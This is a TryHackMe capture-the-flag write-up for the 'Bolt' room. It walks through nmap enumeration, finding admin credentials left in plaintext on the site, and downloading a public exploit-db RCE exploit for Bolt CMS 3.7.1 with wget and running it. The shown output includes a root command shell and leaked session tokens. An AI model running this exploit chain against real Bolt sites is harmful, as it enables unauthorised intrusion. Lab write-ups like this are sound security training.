# Bolt CTF [TryHackMe](https://tryhackme.com/room/bolt)

---

![](./.assets/logo.png)

---

## Index

##### - [Enumeration](#enumeration)
##### - [Finding Vunerabilities](#finding-vunerabilities)
##### - [Gaining a shell](#gaining-a-shell)
##### - [Final Thoughts](#final-thoughts)

---

```bash
export IP=10.10.67.209
```

---

### Enumeration

```bash
nmap -sC -sV -v $IP -oN nmap/initial.log
```

```
# Nmap 7.91 scan initiated Sat Aug  7 20:05:59 2021 as: nmap -vvv -p 22,80,8000 -sC -sV -A -v -oN nmap/initial.log 10.10.67.209
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.0 404 Not Found\r\n(?:[^<]+|<(?!/head>))*?<style>\nbody \{ background-color: #fcfcfc; color: #333333; margin: 0; padding:0; \}\nh1 \{ font-size: 1\.5em; font-weight: normal; background-color: #9999cc; min-height:2em; line-height:2em; border-bottom: 1px inset black; margin: 0; \}\nh1, p \{ padding-left: 10px; \}\ncode\.url \{ background-color: #eeeeee; font-family:monospace; padding:0 2px;\}\n</style>'
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.0 404 Not Found\r\n(?:[^<]+|<(?!/head>))*?<style>\nbody \{ background-color: #ffffff; color: #000000; \}\nh1 \{ font-family: sans-serif; font-size: 150%; background-color: #9999cc; font-weight: bold; color: #000000; margin-top: 0;\}\n</style>'
Nmap scan report for 10.10.67.209
Host is up, received syn-ack (0.14s latency).
Scanned at 2021-08-07 20:06:00 +04 for 29s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f3:85:ec:54:f2:01:b1:94:40:de:42:e8:21:97:20:80 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDaKxKph/4I3YG+2GjzPjOevcQldxrIll8wZ8SZyy2fMg3S5tl5G6PBFbF9GvlLt1X/gadOlBc99EG3hGxvAyoujfdSuXfxVznPcVuy0acAahC0ohdGp3fZaPGJMl7lW0wkPTHO19DtSsVPniBFdrWEq9vfSODxqdot8ij2PnEWfnCsj2Vf8hI8TRUBcPcQK12IsAbvBOcXOEZoxof/IQU/rSeiuYCvtQaJh+gmL7xTfDmX1Uh2+oK6yfCn87RpN2kDp3YpEHVRJ4NFNPe8lgQzekGCq0GUZxjUfFg1JNSWe1DdvnaWnz8J8dTbVZiyNG3NAVAwP1+iFARVOkiH1hi1
|   256 77:c7:c1:ae:31:41:21:e4:93:0e:9a:dd:0b:29:e1:ff (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE52sV7veXSHXpLFmu5lrkk8HhYX2kgEtphT3g7qc1tfqX4O6gk5IlBUH25VUUHOhB5BaujcoBeId/pMh4JLpCs=
|   256 07:05:43:46:9d:b2:3e:f0:4d:69:67:e4:91:d3:d3:7f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINZwq5mZftBwFP7wDFt5kinK8mM+Gk2MaPebZ4I0ukZ+
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8000/tcp open  http    syn-ack (PHP 7.2.32-1)
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 Not Found
|     Date: Sat, 07 Aug 2021 16:06:12 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
|     Cache-Control: private, must-revalidate
|     Date: Sat, 07 Aug 2021 16:06:12 GMT
|     Content-Type: text/html; charset=UTF-8
|     pragma: no-cache
|     expires: -1
|     X-Debug-Token: 7aae9e
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Bolt | A hero is unleashed</title>
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">
|     <meta name="generator" content="Bolt">
|     </head>
|     <body>
|     href="#main-content" class="vis
|   GetRequest:
|     HTTP/1.0 200 OK
|     Date: Sat, 07 Aug 2021 16:06:12 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
|     Cache-Control: public, s-maxage=600
|     Date: Sat, 07 Aug 2021 16:06:12 GMT
|     Content-Type: text/html; charset=UTF-8
|     X-Debug-Token: 79f404
|     <!doctype html>
|     <html lang="en-GB">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Bolt | A hero is unleashed</title>
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">
|     <meta name="generator" content="Bolt">
|     <link rel="canonical" href="http://0.0.0.0:8000/">
|     </head>
|_    <body class="front">
|_http-generator: Bolt
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Bolt | A hero is unleashed
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.91%I=7%D=8/7%Time=610EAF74%P=x86_64-apple-darwin18.7.0
SF:%r(GetRequest,29E1,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2007\x20Au
SF:g\x202021\x2016:06:12\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x
SF:20PHP/7\.2\.32-1\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\
SF:x20public,\x20s-maxage=600\r\nDate:\x20Sat,\x2007\x20Aug\x202021\x2016:
SF:06:12\x20GMT\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nX-Debug
SF:-Token:\x2079f404\r\n\r\n<!doctype\x20html>\n<html\x20lang=\"en-GB\">\n
SF:\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charse
SF:t=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\"viewport\
SF:"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Bolt\x20\|
SF:\x20A\x20hero\x20is\x20unleashed</title>\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20<link\x20href=\"https://fonts\.googleapis\.com/css\?family=Bitter\|R
SF:oboto:400,400i,700\"\x20rel=\"stylesheet\">\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20<link\x20rel=\"stylesheet\"\x20href=\"/theme/base-2018/css/bulma\
SF:.css\?8ca0842ebb\">\n\x20\x20\x20\x20\x20\x20\x20\x20<link\x20rel=\"sty
SF:lesheet\"\x20href=\"/theme/base-2018/css/theme\.css\?6cb66bfe9f\">\n\x2
SF:0\x20\x20\x20\t<meta\x20name=\"generator\"\x20content=\"Bolt\">\n\x20\x
SF:20\x20\x20\t<link\x20rel=\"canonical\"\x20href=\"http://0\.0\.0\.0:8000
SF:/\">\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body\x20class=\"front\"
SF:>\n\x20\x20\x20\x20\x20\x20\x20\x20<a\x20")%r(FourOhFourRequest,16C3,"H
SF:TTP/1\.0\x20404\x20Not\x20Found\r\nDate:\x20Sat,\x2007\x20Aug\x202021\x
SF:2016:06:12\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20PHP/7\.2\
SF:.32-1\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x20private,
SF:\x20must-revalidate\r\nDate:\x20Sat,\x2007\x20Aug\x202021\x2016:06:12\x
SF:20GMT\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\npragma:\x20no-
SF:cache\r\nexpires:\x20-1\r\nX-Debug-Token:\x207aae9e\r\n\r\n<!doctype\x2
SF:0html>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20in
SF:itial-scale=1\.0\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20<title>Bolt\x20\|\x20A\x20hero\x20is\x20unleashed</title>
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20<link\x20href=\"https://fonts\.google
SF:apis\.com/css\?family=Bitter\|Roboto:400,400i,700\"\x20rel=\"stylesheet
SF:\">\n\x20\x20\x20\x20\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20hre
SF:f=\"/theme/base-2018/css/bulma\.css\?8ca0842ebb\">\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/theme/base-2018/css
SF:/theme\.css\?6cb66bfe9f\">\n\x20\x20\x20\x20\t<meta\x20name=\"generator
SF:\"\x20content=\"Bolt\">\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body
SF:>\n\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\"#main-content\"\x20clas
SF:s=\"vis");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/local/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug  7 20:06:29 2021 -- 1 IP address (1 host up) scanned in 29.99 seconds
```

There's obviously something very interesting with port `8000`, let's manually check it out.

---

### Finding Vunerabilities

It is quickly apparent that this website is using Bolt as its CMS. A quick google for known exploits shows `3.7.1` and `3.7.0` as vunerable. We'll keep that in mind for later.

On the home page, we can see that a user `Jake` has his username on the website for everyone to see, and visiting the other pages reveals his password in plaintext. Very _professsional_ y'know?

Googling for where Bolt's login page is `/login` did not work. it shows `/bolt` is the login which redirects me to `/bolt/login` where I can use the newly found credentials.

Once I have access to that, I notice in the bottom left of the admin dashboard, `Bolt 3.7.1`.

---

### Gaining a shell

Going back to the [exploit](https://www.exploit-db.com/exploits/48296) for version `3.7.1/0` we found earlier, we can launch a shell.

```bash
wget 'https://www.exploit-db.com/exploits/48296' -O exploit.py && \
python3 exploit.py http://$IP:8000 [REDACTED] [REDACTED]
```

```
▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄       ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄       ▄▄  ▄▄▄▄▄▄▄▄▄▄▄
▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░▌     ▐░░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌      ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌░▌   ▐░▐░▌▐░█▀▀▀▀▀▀▀▀▀
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌          ▐░▌▐░▌ ▐░▌▐░▌▐░▌
▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌          ▐░▌ ▐░▐░▌ ▐░▌▐░█▄▄▄▄▄▄▄▄▄
▐░░░░░░░░░░▌ ▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌          ▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌          ▐░▌   ▀   ▐░▌ ▀▀▀▀▀▀▀▀▀█░▌
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌          ▐░▌       ▐░▌          ▐░
▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌ ▄▄▄▄▄▄▄▄▄█░▌
▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌     ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌
 ▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀

Pre Auth rce with low credintanl
#Zero-way By @r3m0t3nu11 speical thanks to @dracula @Mr_Hex
[+] Retrieving CSRF token to submit the login form
[+] Login token is : 1zIvTofRY8NouF0GgrFhOUX60rg1JX-JtL_R2f2hfSE
[+] SESSION INJECTION
[-] Not found.
[-] Not found.
[-] Not found.
[-] Not found.
[-] Not found.
[+] FOUND  : test6
[-] Not found.
[-] Not found.
[-] Not found.
[-] Not found.
Enter OS command , for exit 'quit' : ls
index.html
test10.php
test1.php
test2.php
test3.php
test4.php
test5.php
test6.php
test7.php
test8.php
test9.php
";s:8:"*stack";a:0:{}s:10:"*enabled";i:1;s:17:"*shadowpassword";N;s:14:"*shadowtoken";N;s:17:"*shadowvalidity";N;s:15:"*failedlogins";i:0;s:17:"*throttleduntil";N;s:8:"*roles";a:2:{i:0;s:4:"root";i:1;s:8:"everyone";}s:7:"_fields";a:0:{}s:42:"Bolt\Storage\Entity\Entity_specialFields";a:2:{i:0;s:3:"app";i:1;s:6:"values";}s:7:"*_app";N;s:12:"*_internal";a:1:{i:0;s:11:"contenttype";}}s:8:"*token";O:29:"Bolt\Storage\Entity\Authtoken":12:{s:5:"*id";s:1:"5";s:10:"*user_id";i:1;s:8:"*token";s:64:"9b29bf885eed208fc10778d55da55e127c8d2478268813339c857498e8e2f991";s:7:"*salt";s:32:"42f5376e1e525fd4649dcc5eb5804307";s:11:"*lastseen";O:13:"Carbon\Carbon":3:{s:4:"date";s:26:"2021-08-07 20:37:56.091406";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:5:"*ip";s:9:"10.9.5.34";s:12:"*useragent";s:22:"python-requests/2.24.0";s:11:"*validity";O:13:"Carbon\Carbon":3:{s:4:"date";s:26:"2021-08-21 20:37:56.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:7:"_fields";a:0:{}s:42:"Bolt\Storage\Entity\Entity_specialFields";a:2:{i:0;s:3:"app";i:1;s:6:"values";}s:7:"*_app";N;s:12:"*_internal";a:1:{i:0;s:11:"contenttype";}}s:10:"*checked";i:1628368676;}s:10:"_csrf/bolt";s:43:"lDXlHyMdtLFT51r_XOrosIqFsmme7bqou0JNYQhTitM";s:5:"stack";a:0:{}s:18:"_csrf/user_profile";s:43:"bT61acPFUPAxtDxzgxVZvxjRnBExkSjnpdC4hGGb3jM";}s:12:"_sf2_flashes";a:0:{}s:9:"_sf2_meta";a:3:{s:1:"u";i:1628368682;s:1:"c";i:1628368675;s:1:"l";s:1:"0";}}
Enter OS command , for exit 'quit' : whoami
root
```

Not too bad huh? `flag.txt` is in `/home` and we are done!

---

### Final Thoughts

Super easy room, great for an introduction to new users. I do think `metasploit` was not needed for this, however, it seems like a simple intro for it as well.
Debugging external scripts is something I'd recommend practicing as it shows firsthand how exploits are crafted.

Highly recommended!

---

![](./.assets/bolt.png)
